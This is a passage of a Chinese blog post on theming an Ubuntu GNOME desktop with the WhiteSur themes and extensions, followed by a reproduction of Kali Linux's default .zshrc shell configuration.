调整Firefox样式</span></span><br><span class="line"><span class="built_in">sudo</span> ./tweaks.sh -g -i apple <span class="comment"># 调整GDM界面样式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> WhiteSur-icon-theme</span><br><span class="line"><span class="built_in">sudo</span> ./install.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> WhiteSur-cursors</span><br><span class="line"><span class="built_in">sudo</span> ./install.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> apt install gnome-tweaks gnome-browser-connector -y</span><br></pre></td></tr></table></figure><p>主题配置：<br>firefox访问<code>https://extensions.gnome.org</code>，按照页面提示安装Gnome shell集成扩展，搜索安装<code>User Themes</code>+<code>Blur my Shell</code>+<code>Dash to Dock</code></p><p>打开<code>设置</code></p><ul><li><code>显示器-缩放</code>设置缩放比例<code>150%</code>，如果没有<code>150%</code>选项则打开<code>Fractional Scaling</code></li></ul><p>打开<code>扩展</code>应用，启用上述三个扩展，禁用<code>Ubuntu Dock</code>，其他扩展按需自行启用</p><ul><li><code>User Themes</code>设置选择WhiteSur主题</li><li><code>Blur my Shell</code>禁用Dock Blur</li><li><code>Dash to Dock</code>设置位置为底部，外观自定义</li></ul><p>打开<code>优化</code>应用</p><ul><li><code>字体</code>选择文泉驿系列，字体大小11-12</li><li><code>外观-样式</code>选择WhiteSur主题</li><li><code>窗口-标题栏按钮-放置</code>选择<code>左</code></li></ul><h1 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h1><p>从kali拿一个<code>.zshrc</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ~/.zshrc file for zsh interactive shells.</span></span><br><span class="line"><span class="comment"># see /usr/share/doc/zsh/examples/zshrc for examples</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setopt</span> autocd              <span class="comment"># change directory just by typing its name</span></span><br><span class="line"><span class="comment">#setopt correct            # auto correct mistakes</span></span><br><span class="line"><span class="built_in">setopt</span> interactivecomments <span class="comment"># allow comments in interactive mode</span></span><br><span class="line"><span class="built_in">setopt</span> magicequalsubst     <span class="comment"># enable filename expansion for arguments of the form ‘anything=expression’</span></span><br><span class="line"><span class="built_in">setopt</span> nonomatch           <span class="comment"># hide error message if there is no match for the pattern</span></span><br><span class="line"><span class="built_in">setopt</span> notify              <span class="comment"># report the status of background jobs immediately</span></span><br><span class="line"><span class="built_in">setopt</span> numericglobsort     <span class="comment"># sort filenames numerically when it makes sense</span></span><br><span class="line"><span class="built_in">setopt</span> promptsubst         <span class="comment"># enable command substitution in prompt</span></span><br><span class="line"></span><br><span class="line">WORDCHARS=<span class="variable">$&#123;WORDCHARS//\/&#125;</span> <span class="comment"># Don&#x27;t consider certain characters part of the word</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hide EOL sign (&#x27;%&#x27;)</span></span><br><span class="line">PROMPT_EOL_MARK=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># configure key keybindings</span></span><br><span class="line"><span class="built_in">bindkey</span> -e                                        <span class="comment"># emacs key bindings</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27; &#x27;</span> magic-space                           <span class="comment"># do history expansion on space</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^U&#x27;</span> backward-kill-line                   <span class="comment"># ctrl + U</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[3;5~&#x27;</span> kill-word                       <span class="comment"># ctrl + Supr</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[3~&#x27;</span> delete-char                       <span class="comment"># delete</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[1;5C&#x27;</span> forward-word                    <span class="comment"># ctrl + -&gt;</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[1;5D&#x27;</span> backward-word                   <span class="comment"># ctrl + &lt;-</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[5~&#x27;</span> beginning-of-buffer-or-history    <span class="comment"># page up</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[6~&#x27;</span> end-of-buffer-or-history          <span class="comment"># page down</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[H&#x27;</span> beginning-of-line                  <span class="comment"># home</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[F&#x27;</span> end-of-line                        <span class="comment"># end</span></span><br><span class="line"><span class="built_in">bindkey</span> <span class="string">&#x27;^[[Z&#x27;</span> undo                               <span class="comment"># shift + tab undo last action</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enable completion features</span></span><br><span class="line"><span class="built_in">autoload</span> -Uz compinit</span><br><span class="line">compinit -d ~/.cache/zcompdump</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*:*:*:*:*&#x27;</span> menu <span class="keyword">select</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> auto-description <span class="string">&#x27;specify: %d&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> completer _expand _complete</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> format <span class="string">&#x27;Completing %d&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> group-name <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-colors <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-prompt %SAt %p: Hit TAB <span class="keyword">for</span> more, or the character to insert%s</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> matcher-list <span class="string">&#x27;m:&#123;a-zA-Z&#125;=&#123;A-Za-z&#125;&#x27;</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> <span class="built_in">rehash</span> <span class="literal">true</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> select-prompt %SScrolling active: current selection at %p%s</span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> use-compctl <span class="literal">false</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> verbose <span class="literal">true</span></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*:kill:*&#x27;</span> <span class="built_in">command</span> <span class="string">&#x27;ps -u $USER -o pid,%cpu,tty,cputime,cmd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># History configurations</span></span><br><span class="line">HISTFILE=~/.zsh_history</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SAVEHIST=2000</span><br><span class="line"><span class="built_in">setopt</span> hist_expire_dups_first <span class="comment"># delete duplicates first when HISTFILE size exceeds HISTSIZE</span></span><br><span class="line"><span class="built_in">setopt</span> hist_ignore_dups       <span class="comment"># ignore duplicated commands history list</span></span><br><span class="line"><span class="built_in">setopt</span> hist_ignore_space      <span class="comment"># ignore commands that start with space</span></span><br><span class="line"><span class="built_in">setopt</span> hist_verify            <span class="comment"># show command with history expansion to user before running it</span></span><br><span class="line"><span class="comment">#setopt share_history         # share command history data</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># force zsh to show the complete history</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">history</span>=<span class="string">&quot;history 0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># configure `time` format</span></span><br><span class="line">TIMEFMT=$<span class="string">&#x27;\nreal\t%E\nuser\t%U\nsys\t%S\ncpu\t%P&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make less more friendly for non-text input files, see lesspipe(1)</span></span><br><span class="line"><span class="comment">#[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set variable identifying the chroot you work in (used in the prompt below)</span></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;debian_chroot:-&#125;</span>&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; <span class="keyword">then</span></span><br><span class="line">    debian_chroot=$(<span class="built_in">cat</span> /etc/debian_chroot)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set a fancy prompt (non-color, unless we know we &quot;want&quot; color)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    xterm-color|*-256color) color_prompt=<span class="built_in">yes</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment for a colored prompt, if the terminal has the capability; turned</span></span><br><span class="line"><span class="comment"># off by default to not distract the user: the focus in a terminal window</span></span><br><span class="line"><span class="comment"># should be on the output of commands, not on the prompt</span></span><br><span class="line">force_color_prompt=<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$force_color_prompt</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; <span class="keyword">then</span></span><br><span class="line">        <span class="comment"># We have color support; assume it&#x27;s compliant with Ecma-48</span></span><br><span class="line">        <span class="comment"># (ISO/IEC-6429). (Lack of such support is extremely rare, and such</span></span><br><span class="line">        <span class="comment"># a case would tend to support setf rather than setaf.)</span></span><br><span class="line">        color_prompt=<span class="built_in">yes</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        color_prompt=</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">configure_prompt</span></span>() &#123;</span><br><span class="line">    prompt_symbol=㉿</span><br><span class="line">    <span class="comment"># Skull emoji for root terminal</span></span><br><span class="line">    <span class="comment">#[ &quot;$EUID&quot; -eq 0 ] &amp;&amp; prompt_symbol=💀</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$PROMPT_ALTERNATIVE</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">        twoline)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;%F&#123;%(#.blue.green)&#125;┌──$&#123;debian_chroot:+($debian_chroot)─&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─&#125;(%B%F&#123;%(#.red.blue)&#125;%n&#x27;</span>$prompt_symbol$<span class="string">&#x27;%m%b%F&#123;%(#.blue.green)&#125;)-[%B%F&#123;reset&#125;%(6~.%-1~/…/%4~.%5~)%b%F&#123;%(#.blue.green)&#125;]\n└─%B%(#.%F&#123;red&#125;#.%F&#123;blue&#125;$)%b%F&#123;reset&#125; &#x27;</span></span><br><span class="line">            <span class="comment"># Right-side prompt with exit codes and background processes</span></span><br><span class="line">            <span class="comment">#RPROMPT=$&#x27;%(?.. %? %F&#123;red&#125;%B⨯%b%F&#123;reset&#125;)%(1j. %j %F&#123;yellow&#125;%B⚙%b%F&#123;reset&#125;.)&#x27;</span></span><br><span class="line">            ;;</span><br><span class="line">        oneline)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%B%F&#123;%(#.red.blue)&#125;%n@%m%b%F&#123;reset&#125;:%B%F&#123;%(#.blue.green)&#125;%~%b%F&#123;reset&#125;%(#.#.$) &#x27;</span></span><br><span class="line">            RPROMPT=</span><br><span class="line">            ;;</span><br><span class="line">        backtrack)</span><br><span class="line">            PROMPT=$<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%B%F&#123;red&#125;%n@%m%b%F&#123;reset&#125;:%B%F&#123;blue&#125;%~%b%F&#123;reset&#125;%(#.#.$) &#x27;</span></span><br><span class="line">            RPROMPT=</span><br><span class="line">            ;;</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line">    <span class="built_in">unset</span> prompt_symbol</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following block is surrounded by two delimiters.</span></span><br><span class="line"><span class="comment"># These delimiters must not be modified. Thanks.</span></span><br><span class="line"><span class="comment"># START KALI CONFIG VARIABLES</span></span><br><span class="line">PROMPT_ALTERNATIVE=twoline</span><br><span class="line">NEWLINE_BEFORE_PROMPT=<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># STOP KALI CONFIG VARIABLES</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$color_prompt</span>&quot;</span> = <span class="built_in">yes</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># override default virtualenv indicator in prompt</span></span><br><span class="line">    VIRTUAL_ENV_DISABLE_PROMPT=1</span><br><span class="line"></span><br><span class="line">    configure_prompt</span><br><span class="line"></span><br><span class="line">    <span class="comment"># enable syntax-highlighting</span></span><br><span class="line">    <span class="keyword">if</span> [ -f /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; <span class="keyword">then</span></span><br><span class="line">        . /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br><span class="line">        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[default]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[unknown-token]=<span class="built_in">fg</span>=white,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[reserved-word]=<span class="built_in">fg</span>=cyan,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[suffix-alias]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[global-alias]=<span class="built_in">fg</span>=green,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[precommand]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[commandseparator]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[autodirectory]=<span class="built_in">fg</span>=green,underline</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path]=bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[globbing]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[history-expansion]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[command-substitution]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[process-substitution]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=<span class="built_in">fg</span>=green</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=<span class="built_in">fg</span>=green</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=<span class="built_in">fg</span>=yellow</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[rc-quote]=<span class="built_in">fg</span>=magenta</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[assign]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[redirection]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[comment]=<span class="built_in">fg</span>=black,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[named-fd]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[arg0]=<span class="built_in">fg</span>=cyan</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-error]=<span class="built_in">fg</span>=red,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=<span class="built_in">fg</span>=blue,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=<span class="built_in">fg</span>=green,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=<span class="built_in">fg</span>=magenta,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=<span class="built_in">fg</span>=yellow,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=<span class="built_in">fg</span>=cyan,bold</span><br><span class="line">        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    PROMPT=<span class="string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;%n@%m:%~%(#.#.$) &#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">unset</span> color_prompt force_color_prompt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">toggle_oneline_prompt</span></span>()&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$PROMPT_ALTERNATIVE</span>&quot;</span> = oneline ]; <span class="keyword">then</span></span><br><span class="line">        PROMPT_ALTERNATIVE=twoline</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        PROMPT_ALTERNATIVE=oneline</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    configure_prompt</span><br><span class="line">    <span class="built_in">zle</span> reset-prompt</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">zle</span> -N toggle_oneline_prompt</span><br><span class="line"><span class="built_in">bindkey</span> ^P toggle_oneline_prompt</span><br><span class="line"></span><br><span class="line"><span class="comment"># If this is an xterm set the title to user@host:dir</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">xterm*|rxvt*|Eterm|aterm|kterm|gnome*|alacritty)</span><br><span class="line">    TERM_TITLE=$<span class="string">&#x27;\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;$&#123;VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))&#125;%n@%m: %~\a&#x27;</span></span><br><span class="line">    ;;</span><br><span class="line">*)</span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">precmd</span></span>() &#123;</span><br><span class="line">    <span class="comment"># Print the previously configured title</span></span><br><span class="line">    <span class="built_in">print</span> -Pnr -- <span class="string">&quot;<span class="variable">$TERM_TITLE</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Print a new line before the prompt, but only if it is not the first line</span></span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$NEWLINE_BEFORE_PROMPT</span>&quot;</span> = <span class="built_in">yes</span> ]; <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$_NEW_LINE_BEFORE_PROMPT</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            _NEW_LINE_BEFORE_PROMPT=1</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable color support of ls, less and man, and also add handy aliases</span></span><br><span class="line"><span class="keyword">if</span> [ -x /usr/bin/dircolors ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">test</span> -r ~/.dircolors &amp;&amp; <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b ~/.dircolors)</span>&quot;</span> || <span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(dircolors -b)</span>&quot;</span></span><br><span class="line">    <span class="built_in">export</span> LS_COLORS=<span class="string">&quot;<span class="variable">$LS_COLORS</span>:ow=30;44:&quot;</span> <span class="comment"># fix ls color for folders with 777 permissions</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias dir=&#x27;dir --color=auto&#x27;</span></span><br><span class="line">    <span class="comment">#alias vdir=&#x27;vdir --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">alias</span> grep=<span class="string">&#x27;grep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> fgrep=<span class="string">&#x27;fgrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> egrep=<span class="string">&#x27;egrep --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> diff=<span class="string">&#x27;diff --color=auto&#x27;</span></span><br><span class="line">    <span class="built_in">alias</span> ip=<span class="string">&#x27;ip --color=auto&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_mb=$<span class="string">&#x27;\E[1;31m&#x27;</span>     <span class="comment"># begin blink</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_md=$<span class="string">&#x27;\E[1;36m&#x27;</span>     <span class="comment"># begin bold</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_me=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset bold/blink</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_so=$<span class="string">&#x27;\E[01;33m&#x27;</span>    <span class="comment"># begin reverse video</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_se=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset reverse video</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_us=$<span class="string">&#x27;\E[1;32m&#x27;</span>     <span class="comment"># begin underline</span></span><br><span class="line">    <span class="built_in">export</span> LESS_TERMCAP_ue=$<span class="string">&#x27;\E[0m&#x27;</span>        <span class="comment"># reset underline</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of $LS_COLORS for completion as well</span></span><br><span class="line">    <span class="built_in">zstyle</span> <span class="string">&#x27;:completion:*&#x27;</span> list-colors <span class="string">&quot;<span class="variable">$&#123;(s.:.)LS_COLORS&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">zstyle</span> <span 